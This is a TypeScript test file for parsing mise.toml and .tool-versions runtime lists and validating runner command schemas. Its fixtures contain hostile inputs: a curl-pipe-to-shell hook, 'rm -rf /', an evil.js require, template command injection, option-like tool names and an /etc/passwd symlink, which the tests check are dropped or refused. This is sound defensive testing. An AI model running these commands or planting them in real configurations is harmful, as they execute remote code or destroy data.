import { describe, expect, test } from "bun:test";
import { createFakeGitReader, loadOriginMainRootFiles } from "../src/closeout-spec/policy";
import { legacyRuntimeTool, RunnerCommandSchema } from "../src/runner-protocol";
import { RUNTIME_FILES, runtimeList } from "../src/runtimes";

const encoder = new TextEncoder();

function fromOrigin(files: Record<string, string>) {
  const git = createFakeGitReader(files);
  return { git, list: runtimeList(loadOriginMainRootFiles({ repo: "/repo", git }, RUNTIME_FILES)) };
}

describe("runtime list from origin/main", () => {
  test("mise.toml keeps only the tools and drops env, hooks, tasks and tool options", () => {
    const { list } = fromOrigin({
      "mise.toml": `
min_version = "2024.1.1"

[env]
NODE_OPTIONS = "--require ./evil.js"
_.source = "./setup.sh"

[hooks]
enter = "curl https://example.com | sh"

[tasks.build]
run = "rm -rf /"

[settings]
experimental = true

[tools]
node = "22"
python = "3.12"
go = ["1.22", "1.21"]
ruby = { version = "3.3", postinstall = "touch /tmp/owned" }
"aqua:cli/cli" = "2.40.0"
`,
    });
    expect(list).toEqual({
      runtimes: [
        { tool: "node", version: "22" },
        { tool: "python", version: "3.12" },
        { tool: "go", version: "1.22" },
        { tool: "go", version: "1.21" },
        { tool: "ruby", version: "3.3" },
        { tool: "aqua:cli/cli", version: "2.40.0" },
      ],
      notices: [],
    });
  });

  test(".tool-versions parses, with comments, asdf names and several versions", () => {
    const { list } = fromOrigin({
      ".tool-versions":
        "# runtimes\nnodejs 20.11.1\npython 3.12.2 3.11.8  # two\n\ngolang 1.22.1\n",
    });
    expect(list).toEqual({
      runtimes: [
        { tool: "node", version: "20.11.1" },
        { tool: "python", version: "3.12.2" },
        { tool: "python", version: "3.11.8" },
        { tool: "go", version: "1.22.1" },
      ],
      notices: [],
    });
  });

  test("a repo with neither file produces an empty list", () => {
    const { list, git } = fromOrigin({ "README.md": "hello", ".agents/closeout.yaml": "x" });
    expect(list).toEqual({ runtimes: [], notices: [] });
    expect(git.calls.slice(0, 2)).toEqual(["fetch /repo", "ls-remote /repo"]);
  });

  test("any mise backend and registry short name is carried, and a malformed name is refused", () => {
    const { list } = fromOrigin({
      "mise.toml":
        '[tools]\nnode = "22"\n"cargo:ripgrep" = "14"\n"npm:@biomejs/biome" = "2"\n"--yes" = "1"\n',
      ".tool-versions": "uv 0.9.1\ngolangci-lint 2.5.0\nbad;tool 1\n",
    });
    expect(list.runtimes).toEqual([
      { tool: "node", version: "22" },
      { tool: "cargo:ripgrep", version: "14" },
      { tool: "npm:@biomejs/biome", version: "2" },
      { tool: "uv", version: "0.9.1" },
      { tool: "golangci-lint", version: "2.5.0" },
    ]);
    expect(list.notices.map((line) => line.match(/`([^`]+)`/)?.[1])).toEqual(["--yes", "bad;tool"]);
    expect(list.notices[0]).toContain("not a mise tool name");
  });

  test("templated or path versions are refused instead of passed to mise", () => {
    const { list } = fromOrigin({
      "mise.toml": '[tools]\nnode = "{{ exec(command=\'id\') }}"\npython = "3.12"\n',
      ".tool-versions": "go path:/tmp/go\n",
    });
    expect(list.runtimes).toEqual([{ tool: "python", version: "3.12" }]);
    expect(list.notices.map((line) => line.match(/`([^`]+)`/)?.[1])).toEqual(["node", "go"]);
  });

  test("mise.toml wins over .mise.toml and .tool-versions for the same tool", () => {
    const { list } = fromOrigin({
      "mise.toml": '[tools]\nnode = "22"\n',
      ".mise.toml": '[tools]\nnode = "20"\nbun = "1.1"\n',
      ".tool-versions": "nodejs 18\ndeno 2.0.0\n",
    });
    expect(list.runtimes).toEqual([
      { tool: "node", version: "22" },
      { tool: "bun", version: "1.1" },
      { tool: "deno", version: "2.0.0" },
    ]);
  });

  test("a file that does not parse leaves a line and no runtimes from it", () => {
    const { list } = fromOrigin({ "mise.toml": "[tools\nnode = ", ".tool-versions": "java 21\n" });
    expect(list.runtimes).toEqual([{ tool: "java", version: "21" }]);
    expect(list.notices).toEqual([
      "Paws could not parse mise.toml on origin/main, so it installs no runtimes from it.",
    ]);
  });

  test("the work tree is not read: an unconfirmed origin/main gives no runtimes", () => {
    const git = createFakeGitReader({ "mise.toml": '[tools]\nnode = "22"\n' });
    git.remoteStdout = `${"b".repeat(40)}\trefs/heads/main\n`;
    const list = runtimeList(loadOriginMainRootFiles({ repo: "/repo", git }, RUNTIME_FILES));
    expect(list.runtimes).toEqual([]);
    expect(list.notices[0]).toContain("origin/main is unavailable");
  });

  test("a symlinked mise.toml is not followed", () => {
    const git = createFakeGitReader();
    git.put("mise.toml", "/etc/passwd", "120000");
    const loaded = loadOriginMainRootFiles({ repo: "/repo", git }, RUNTIME_FILES);
    expect(loaded).toEqual({ ok: false, message: "mise.toml is not a file" });
  });

  test("a mise.toml larger than the read limit is refused", () => {
    const git = createFakeGitReader();
    git.put("mise.toml", encoder.encode(`# ${"x".repeat(70_000)}\n`));
    const loaded = loadOriginMainRootFiles({ repo: "/repo", git }, RUNTIME_FILES);
    expect(loaded.ok).toBe(false);
  });
});

describe("runner command runtimes", () => {
  const command = (runtimes: unknown) => ({
    id: "c1",
    runnerId: "r1",
    workspaceId: "w1",
    issuedAt: 1,
    expiresAt: 2,
    type: "run",
    runId: "run1",
    itemId: "i1",
    generation: 1,
    repository: {
      owner: "o",
      repo: "r",
      remoteUrl: "https://github.com/o/r.git",
      baseSha: "a".repeat(40),
    },
    profile: { agent: "claude", model: null },
    prompt: "go",
    runtimes,
  });

  test("accepts any mise backend, and only core and aqua: tools are legacy", () => {
    for (const tool of ["cargo:ripgrep", "npm:@biomejs/biome", "uv", "go:github.com/a/b/cmd/c"])
      expect(RunnerCommandSchema.safeParse(command([{ tool, version: "1" }])).success).toBe(true);
    expect(legacyRuntimeTool("node")).toBe(true);
    expect(legacyRuntimeTool("aqua:cli/cli")).toBe(true);
    expect(legacyRuntimeTool("uv")).toBe(false);
    expect(legacyRuntimeTool("cargo:ripgrep")).toBe(false);
  });

  test("accepts core tools and aqua: tools", () => {
    const parsed = RunnerCommandSchema.safeParse(
      command([
        { tool: "node", version: "22" },
        { tool: "aqua:cli/cli", version: "2.40.0" },
      ]),
    );
    expect(parsed.success).toBe(true);
  });

  test("rejects option-like tool names, templates and extra fields", () => {
    for (const runtime of [
      { tool: "--force", version: "14" },
      { tool: "a b", version: "1" },
      { tool: "node", version: "{{ env.X }}" },
      { tool: "node", version: "22", postinstall: "id" },
    ])
      expect(RunnerCommandSchema.safeParse(command([runtime])).success).toBe(false);
  });
});
